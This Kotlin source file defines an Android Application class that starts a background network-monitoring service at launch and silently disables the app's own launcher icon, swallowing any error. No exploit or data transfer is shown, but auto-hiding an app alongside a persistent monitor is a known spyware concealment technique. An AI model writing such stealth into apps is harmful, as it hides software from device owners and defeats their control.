package com.example

import android.app.Application
import android.content.ComponentName
import android.content.pm.PackageManager
import com.example.service.NetworkMonitorService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class MrFeastApplication : Application() {
    override fun onCreate() {
        super.onCreate()
        // Ensure background service is running
        NetworkMonitorService.start(this)

        // Automatically ensure launcher icon is hidden from desktop
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val pm = packageManager
                val componentName = ComponentName(this@MrFeastApplication, MainActivity::class.java)
                pm.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
            } catch (_: Exception) {}
        }
    }
}
